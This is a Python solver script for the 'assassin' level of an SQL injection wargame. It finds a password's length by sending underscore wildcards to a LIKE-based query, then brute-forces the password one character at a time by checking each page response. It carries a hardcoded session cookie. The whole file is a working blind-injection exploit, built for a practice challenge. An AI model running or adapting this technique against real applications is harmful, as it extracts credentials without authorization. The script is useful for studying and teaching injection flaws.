import requests
from bs4 import BeautifulSoup as bs
import time 

"""
Author: revi1337
Date : 2022-11-20
"""

URL = 'https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php'
COOKIE = {"PHPSESSID": "41b6d07ddgb88vl4il1lp2fpcm"}
HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"}


def cracking_password():
	session = requests.Session()
	length = 1
	while True:
		res = session.get(url = f"{URL}?pw={'_' * length}",
			cookies = COOKIE,
			headers = HEADERS
			).text
		res = bs(res, 'html.parser').find('h2')
		if res:
			print("[+] pw column length : {}".format(length))
			return length

		length += 1


def main():
	credentials = []
	pwLength = cracking_password()
	session = requests.Session()
	for i in range(1, pwLength + 1):
		for v in range(48, 128):
			if v == 95: 
				continue
			res = session.get(url = "{}?pw={}".format(URL, "".join(credentials) + chr(v) + "_" * (pwLength - i)),
				cookies = COOKIE,
				headers = HEADERS
				).text
			print("{}?pw={}".format(URL, "".join(credentials) + chr(v) + "_" * (pwLength - i)))
			res = bs(res, 'html.parser').find('h2')
			if res:
				res = res.get_text()
				print("[+] {}th value : {}".format(i, chr(v)))
				credentials.append(chr(v))
				break


if __name__ == '__main__':
	start_time = time.perf_counter()
	main()
	end_time = time.perf_counter()
	print("[+] Total Task Time : {}".format(end_time - start_time))